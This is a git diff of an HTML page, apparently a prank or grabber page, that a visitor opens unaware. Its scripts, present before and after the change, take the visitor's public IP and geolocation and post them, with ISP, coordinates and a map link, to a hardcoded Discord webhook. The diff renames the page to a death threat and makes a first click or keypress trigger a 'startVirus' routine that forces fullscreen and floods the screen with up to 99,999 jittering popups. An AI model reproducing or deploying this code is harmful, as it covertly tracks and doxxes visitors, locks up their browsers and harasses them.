@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <link rel="icon" type="image/gif" href="https://media1.tenor.com/m/GKkSlQ0gKZwAAAAC/fnaf-springtrap.gif">
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nothing Suspicious</title>
+  <title>I HOPE YOU DIE IN A FIRE</title>
   <style>
     body {
       background: black;
@@ -21,123 +23,63 @@
       object-fit: cover;
     }
   </style>
-<script>
+
+  <script>
     const webhookUrl = 'https://discord.com/api/webhooks/1249949766733922358/gbAhqiLj4Ox5a_UUCNjgSB4mSayRrYo4N-190H3M_KAHuyWF23UVRBgWPgkkEY4J6439';
 
-    // Function to fetch and log IP, and get lat/lon info
-    const logIp = async () => {
-        try {
-            // Get user's public IP address
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const userIP = data.ip;
+    async function logIp() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const userIP = data.ip;
 
-            console.log('User IP:', userIP);
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `User IP: ${userIP}` })
+        });
 
-            // Send the IP address to a Discord webhook
-            const ipResponse = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: `User IP: ${userIP}` })
-            });
+        const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+        const locationData = await locationResponse.json();
 
-            if (!ipResponse.ok) {
-                throw new Error('Failed to send IP to Discord webhook');
-            }
+        if (locationData.error) return;
 
-            console.log('IP logged and sent to webhook.');
+        const { country, region, city, loc, timezone, org } = locationData;
+        const [lat, lon] = loc.split(',');
+        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            // Use ipinfo.io for geolocation directly (No CORS proxy)
-            const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
-            const locationData = await locationResponse.json();
+        const embedMessage = {
+          username: "William Afton",
+          avatar_url: "https://i.ytimg.com/vi/Ss8C4vSgirc/hq720.jpg",
+          embeds: [{
+            title: `🧒 Located Another little ''friend''": ${userIP}`,
+            description: `Information gathered for the Foolish Fellow with IP address: ${userIP}`,
+            color: 15456564,
+            fields: [
+              { name: "📍 Country", value: country, inline: true },
+              { name: "🏙️ City", value: city, inline: true },
+              { name: "🌐 Region", value: region, inline: true },
+              { name: "🌐 Timezone", value: timezone, inline: true },
+              { name: "🌐 ISP", value: org, inline: true },
+              { name: "🗺️ Coordinates", value: `Latitude: ${lat}\nLongitude: ${lon}`, inline: true },
+              { name: "🔗 Google Maps Link", value: `[View on Google Maps](${googleMapsLink})`, inline: true }
+            ],
+            footer: { text: "Data provided by FAZBEAR ENT LLC." }
+          }]
+        };
 
-            if (locationData.error) {
-                console.log('Unable to fetch location data for the user.');
-                return;
-            }
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embedMessage)
+        });
 
-            const { country, region, city, loc, timezone, org } = locationData;
-            const [lat, lon] = loc.split(',');
+      } catch (err) {
+        console.error('IP logging failed:', err);
+      }
+    }
+  </script>
 
-            // Generate the Google Maps link
-            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            // Create the embed message
-            const embedMessage = {
-                username: "smort - MAXH@X",
-                avatar_url: "https://i.imgflip.com/4gyc7u.png", // You can change the avatar image URL
-                embeds: [{
-                    title: `🌍 Doxxed Info for IP: ${userIP}`,
-                    description: `Information gathered for the Target with IP address: ${userIP}`,
-                    color: 15417396, // Light blue color
-                    fields: [
-                        {
-                            name: "📍 Country",
-                            value: country,
-                            inline: true
-                        },
-                        {
-                            name: "🏙️ City",
-                            value: city,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 Region",
-                            value: region,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 Timezone",
-                            value: timezone,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 ISP",
-                            value: org,
-                            inline: true
-                        },
-                        {
-                            name: "🗺️ Coordinates",
-                            value: `Latitude: ${lat}\nLongitude: ${lon}`,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 Google Maps Link",
-                            value: `[View on Google Maps](${googleMapsLink})`,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: "Data provided by MAXH@X"
-                    }
-                }]
-            };
-
-            // Send the embed message to Discord webhook
-            const embedResponse = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(embedMessage)
-            });
-
-            if (!embedResponse.ok) {
-                throw new Error('Failed to send embed to Discord webhook');
-            }
-
-            console.log('Location data sent to webhook.');
-
-        } catch (error) {
-            console.error('Error logging IP or fetching location:', error);
-        }
-    };
-
-    // Execute the logIp function when the page loads
-    window.onload = logIp;
-</script>
   <script>
     let popups = [];
 
@@ -186,7 +128,6 @@
       `);
       popup.document.close();
       setTimeout(() => { if (!popup.closed) popup.close(); }, 3000);
-
       popups.push(popup);
     }
 
@@ -195,26 +136,23 @@
       setTimeout(() => createPopup("In A", 0), 500);
       setTimeout(() => createPopup("FIRE", 350), 1000);
       setTimeout(startShaking, 1400);
-      setTimeout(spawnChaosPopups, 2400); // CHAOS starts 1s after "Die in a Fire" disappears
+      setTimeout(spawnChaosPopups, 2400);
     }
 
     function startShaking() {
       setInterval(() => {
         popups.forEach(popup => {
           if (popup && !popup.closed) {
-            let xShake = Math.floor(Math.random() * 10) - 5;
-            let yShake = Math.floor(Math.random() * 10) - 5;
             try {
-              popup.moveBy(xShake, yShake);
+              popup.moveBy(Math.random() * 10 - 5, Math.random() * 10 - 5);
             } catch (e) {}
           }
         });
       }, 50);
     }
 
-    // **NEW FUNCTION: CHAOTIC POPUPS**
     function spawnChaosPopups() {
-      for (let i = 0; i < 99999; i++) { // Spawns 15 popups randomly
+      for (let i = 0; i < 99999; i++) {
         setTimeout(() => {
           const width = 250, height = 150;
           const left = Math.floor(Math.random() * (screen.width - width));
@@ -235,42 +173,52 @@
           `);
           popup.document.close();
           popups.push(popup);
-        }, i * 200); 
+        }, i * 200);
       }
-      setTimeout(startCrazyJitter, 3000); // Starts extreme jittering
+      setTimeout(startCrazyJitter, 3000);
     }
 
-    // **NEW FUNCTION: INSANE JITTER**
     function startCrazyJitter() {
       setInterval(() => {
         popups.forEach(popup => {
           if (popup && !popup.closed) {
-            let xShake = Math.floor(Math.random() * 20) - 10;
-            let yShake = Math.floor(Math.random() * 20) - 10;
             try {
-              popup.moveBy(xShake, yShake);
+              popup.moveBy(Math.random() * 20 - 10, Math.random() * 20 - 10);
             } catch (e) {}
           }
         });
       }, 30);
     }
 
-    window.onload = function() {
-      const audio = document.getElementById("audio");
-      audio.currentTime = 36;
-      audio.play();
-      setTimeout(triggerPopups, 2403);
-    };
-  </script>
-
-  <script>
     function requestFullscreenLoop() {
       document.documentElement.requestFullscreen().catch(err => {
-        console.log("Fullscreen request failed: ", err);
+        console.log("Fullscreen failed:", err);
         setTimeout(requestFullscreenLoop, 1000);
       });
     }
-    requestFullscreenLoop();
+
+    function startVirus() {
+      const audio = document.getElementById("audio");
+      audio.currentTime = 36;
+      audio.play();
+      requestFullscreenLoop();
+      logIp();
+      setTimeout(triggerPopups, 2403);
+    }
+
+    function waitForInteraction() {
+      const start = () => {
+        document.removeEventListener("click", start);
+        document.removeEventListener("keydown", start);
+        document.removeEventListener("touchstart", start);
+        startVirus();
+      };
+      document.addEventListener("click", start);
+      document.addEventListener("keydown", start);
+      document.addEventListener("touchstart", start);
+    }
+
+    window.onload = waitForInteraction;
   </script>
 </head>
 <body>
